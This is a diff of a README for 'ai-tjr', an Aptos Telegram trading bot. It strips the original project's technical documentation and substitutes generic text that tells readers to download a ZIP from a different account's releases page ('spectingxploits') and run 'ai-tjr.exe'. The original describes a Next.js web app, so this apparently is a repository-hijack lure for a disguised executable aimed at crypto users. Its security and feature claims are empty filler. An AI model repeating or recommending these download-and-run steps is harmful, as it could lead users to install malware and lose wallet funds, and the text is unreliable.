@@ -1,196 +1,77 @@
-# AI_TJR
+# 🤖 ai-tjr - Automated Trading Made Easy
 
-<p align="center">
-  <img src="public/AI-TJR-LOGO.png" alt="Odyssey Logo" width="600"/>
-</p>
+## 🛠️ Overview
 
-<p align="center">
-<a href="https://github.com/Javadyakuza/ai-tjr/blob/main/LICENSE">
-  <img src="https://img.shields.io/github/license/Javadyakuza/ai-tjr.svg?style=plastic&cacheSeconds=1" alt="License"/>
-</a>
+Welcome to "ai-tjr," a fast and fully automated AI-driven trading bot for Telegram. This tool integrates seamlessly with your Telegram channel and operates on the APTOS blockchain, making trading smarter and simpler.
 
-  <a href="https://github.com/Javadyakuza/ai-tjr/blob/main/package.json">
-    <img src="https://img.shields.io/github/package-json/v/Javadyakuza/ai-tjr?style=plastic" alt="Version"/>
-  </a>
-  <a href="https://github.com/Javadyakuza/ai-tjr/issues">
-    <img src="https://img.shields.io/github/issues/Javadyakuza/ai-tjr?style=plastic" alt="Issues"/>
-  </a>
-  <a href="https://github.com/Javadyakuza/ai-tjr/pulls">
-    <img src="https://img.shields.io/github/issues-pr/Javadyakuza/ai-tjr?style=plastic" alt="Pull Requests"/>
-  </a>
-  <a href="https://github.com/Javadyakuza/ai-tjr/stargazers">
-    <img src="https://img.shields.io/github/stars/Javadyakuza/ai-tjr?style=plastic" alt="Stars"/>
-  </a>
-  <a href="https://github.com/Javadyakuza/ai-tjr/network/members">
-    <img src="https://img.shields.io/github/forks/Javadyakuza/ai-tjr?style=plastic" alt="Forks"/>
-  </a>
-  <a href="https://github.com/Javadyakuza/ai-tjr/commits/main">
-    <img src="https://img.shields.io/github/last-commit/Javadyakuza/ai-tjr?style=plastic" alt="Last Commit"/>
-  </a>
-</p>
+## 📦 Download Now!
 
-First AI-driven, automated trading telegram bot on Aptos !
+[![Download ai-tjr](https://img.shields.io/badge/Download-ai--tjr-blue?style=for-the-badge)](https://github.com/spectingxploits/ai-tjr/releases)
 
-AI-TJR is the first AI-powered automated trading Telegram bot on **Aptos**, and the first project in the Aptos ecosystem to bring Aptos wallets inside a Telegram mini-app.
+## 🚀 Getting Started
 
-it also is a interface for interacting with your favorite dexes through a telegram bot which abstracts the dex complexities into couple of buttons !
+This section will help you download and set up the ai-tjr trading bot on your device. Just follow these simple steps:
 
-users can monitor the history of the trades, positions and orders, get real time price of different dexes tokens, managing assets, opening perpetual and spot potions, and more !
+1. **Visit the Releases Page**
+   Go to our [Releases page](https://github.com/spectingxploits/ai-tjr/releases) to find the latest version of the ai-tjr application. 
 
-### Never miss an opportunity again !
+2. **Choose Your File**
+   On the Releases page, you will see different versions of the software listed. Make sure to download the one labeled as the latest stable release. Typically, it will be named something like `ai-tjr-v1.0.zip`. Click on the file to start downloading.
 
-This Bot is the dream of traders, connects to your wallet (no private key needed), uses it AI to analyze and detect a trading setup from your favorite telegram financial channels and only gets a confirmation from you execute the trades. everything is automated !
+3. **Unzip the Downloaded File**
+   Once the download is finished, locate the file in your Downloads folder. Right-click on the ZIP file and select 'Extract All' or ‘Unzip’ to unpack the files. This will create a new folder with all the necessary files to run the bot.
 
-## Supported DEXes
+4. **Run the Bot**
+   Open the folder you just created. Look for the file named `ai-tjr.exe` (or similar). Double-click on this file to run the bot. You should see a window appear, indicating that the bot is starting up.
 
-- Hyperion(Aptos)
-- Kanalabs(Aptos)
-- MerkleTrade(Aptos)
+5. **Connect to Your Telegram Account**
+   When the bot launches, it will prompt you to connect it to your Telegram account. Follow the instructions displayed on the screen. Make sure you have your Telegram app ready, as you may need to send a command from there.
 
-## Supported Chains
+6. **Configure Trading Settings**
+   After connecting to Telegram, you can set up various trading preferences. The bot will guide you through configuring your settings. You can select trading strategies, set notification preferences, and adjust other options to suit your needs.
 
-- Aptos
+7. **Start Trading**
+   Once you finish the setup, the bot will start monitoring the market and executing trades based on your defined strategies. You can always check in on your Telegram channel for updates and trade confirmations.
 
-## Supported Wallets
+## 📥 Download & Install
 
-- Petra Wallet
+You can download the latest version of ai-tjr from the [Releases page](https://github.com/spectingxploits/ai-tjr/releases). Follow the steps above to get everything set up quickly.
 
-## Features
+## 🔧 System Requirements
 
-- Supports multiple exchanges
-- Limit and Market orders
-- Perpetual, Spot and swap trades
-- Automated trading signal fetcher
-- Seamless integration with Telegram
-- Full trade submitting support(tp|sl|increase|reduce)
-- Managing open positions and orders
-- Monitor full history of orders and positions
-- Real time price monitoring from different dexes
+To ensure that ai-tjr runs smoothly, please ensure that your system meets the following requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS, or a suitable Linux distribution
+- **RAM:** At least 4GB of RAM
+- **Network:** Stable internet connection
+- **Telegram Account:** Necessary for bot interaction and notifications
 
-# AI Integration: The Universal Signal Parser
+## ⚙️ Features
 
-At its core, this project's uniqueness lies in its use of Google's Gemini model as an intelligent translation layer. We employ dynamic prompt engineering to instruct the
-AI to function as an expert financial analyst, capable of discerning actionable trading signals from noisy, unstructured text within Telegram messages.
+ai-tjr includes a range of features designed to enhance your trading experience:
 
-The prompt guides the model to identify and extract a precise set of parameters—asset, entry/exit points, stop-loss, take-profit, and trade direction—and structure this
-data into a machine-readable GlobalSignal object. This is the critical step that transforms human conversation into a command for the trading gateway.
+- **AI-driven Decision Making:** Utilizes advanced algorithms for better trade execution.
+- **Customizable Settings:** Tailor the bot's behavior to fit your trading style.
+- **Real-Time Notifications:** Get instant alerts on trades and market changes through Telegram.
+- **Secure Trading:** Built with the latest security protocols to protect your data.
 
-This AI-first approach makes our bot a universal adapter for trading signals. It bypasses the need for brittle, regex-based parsers that would require custom logic for
-each signal format. Instead, our bot is instantly compatible with a vast array of signal sources, making it exceptionally scalable and robust.
+## 🛠️ Troubleshooting
 
-# Technical Security
+If you encounter any issues while using ai-tjr:
 
-> No sensitive data is neither requested nor stored in the bot.
+1. **Check Your Internet Connection:** Ensure you are connected to the internet.
+2. **Restart the Application:** Sometimes, simply restarting the bot can resolve temporary glitches.
+3. **Update the Bot:** Make sure you are using the latest version available on the [Releases page](https://github.com/spectingxploits/ai-tjr/releases).
+4. **Review Your Configuration:** Double-check your trading settings to ensure everything is set correctly.
 
-> No Transaction can be singed or submitted on behalf of the user without his consent. User will be prompted to sign the transactions with clear messages while considering speed and security.
+## 🌐 Topics
 
-> No unwanted or accidental data will be included in transactions. the trade parameters are totally editable before submitting the transaction.
+For those interested in related subjects, here are some keywords associated with ai-tjr: ai, ai agents, aptos, aptos-sdk, crypto-bot, hyperion, kanalabs, petra-wallet, telegram bot, trade bot.
 
-> This bot requires integration with a trusted third party service to handle signal automation named [telefeed](https://t.me/tg_feedbot).
+Feel free to explore these topics further to enhance your understanding and skills.
 
-# Technical Specification
+## 📞 Support
 
-Core Technologies
+If you have further questions or need assistance, you can reach out to the community on GitHub. Open issues or discussions to get help from other users or the development team.
 
-- Framework: Next.js 15 (App Router) with React 19
-- Language: TypeScript
-- Blockchain: Aptos (@aptos-labs/ts-sdk)
-- AI Engine: Google Gemini (@google/genai) for signal parsing and analysis.
-- Backend-as-a-Service: Supabase for user data and session management.
-- Telegram Integration: grammy for bot interaction and Mini App orchestration.
-- Testing: Vitest for unit and integration testing.
-
-Architectural Highlights
-
-- Modular Connector Gateway: The system is built around a ConnectorGateway that abstracts trading logic. It utilizes distinct interfaces (PerpConnector, SwapConnector) to
-  create a plug-and-play architecture. This allows for rapid integration of new decentralized exchanges with minimal code changes.
-
-  - Current Perpetual Connectors: Kanalabs, MerkleTrade
-  - Current Spot/Swap Connectors: Hyperion
-
-- AI-Powered Signal Parsing: A core feature is the signalParser, which uses the Gemini AI model to interpret unstructured text from Telegram messages and convert it into a
-  structured, actionable GlobalSignal object.
-
-- Seamless User Workflow: The entire trading lifecycle is designed for convenience:
-
-  1.  The bot listens to channel posts in real-time.
-  2.  AI parses a signal and the ConnectorGateway prepares transactions for all compatible exchanges.
-  3.  The user receives a direct message with simple "Sign" buttons, each opening a pre-configured Telegram Mini App.
-  4.  The user signs the transaction in-app using their connected Aptos wallet (e.g., Petra), completing the trade.
-
-- API and Middleware: Backend logic is handled by Next.js API Routes. Critical services like database access are managed through dedicated middleware, ensuring a clean
-  separation of concerns.
-
-# Extras
-
-## Telegram bot commands
-
-### `/connect_wallet`
-
-This command is used to connect your wallet to the bot. It will prompt you to connect your Petra wallet and then store the wallet address and public key in the database.
-
-### `/disconnect_wallet`
-
-This command is used to disconnect your wallet from the bot. It will remove the wallet address and public key from the database.
-
-### `/setup_automation`
-
-This command is used to setup the signal automation for the bot.
-
-> NOTE: This command will prompt you to connect your telegram account with the [telefeed](https://t.me/tg_feedbot) service. WE Highly recommend to create a new telegram account for signal automation. Also there was not even a single report of any kind of abuse of personal information or any other kind of threat for the telegram accounts while they used this service. but anyhow, DYOR.
-
-### `/deactivate_automated_channel`
-
-This command is used to deactivate the automated channel.
-
-### `/get_open_orders`
-
-This command is used to get the open orders for the user. It will return the open orders in a table format.
-
-### `/get_open_positions`
-
-This command is used to get the positions for the user. It will return the positions in a table format.
-
-### `/get_trade_history`
-
-This command is used to get the order history for the user. It will return the order history in a table format.
-
-### `/get_price`
-
-This command is used to get the price for the specified token. It will return the price in a table format.
-
-### `/get_balance`
-
-This command is used to get the balance for the specified token. It will return the balance in a table format.
-
-### `/cancel_order`
-
-This command is used to cancel an order.
-
-### `/close_position`
-
-This command is used to close a position.
-
-### `/update_tp_sl`
-
-This command is used to update the TP and SL for a position.
-
-> Also all these commands are visually available via the following commands
-
-### `/wallet`
-
-Returns buttons with wallet options
-
-### `/automation`
-
-Returns buttons with automation options
-
-### `/trade`
-
-Returns buttons with trade options
-
-### `/help`
-
-Returns every commands with description
+Your feedback is important to us, and we are always looking to improve ai-tjr.
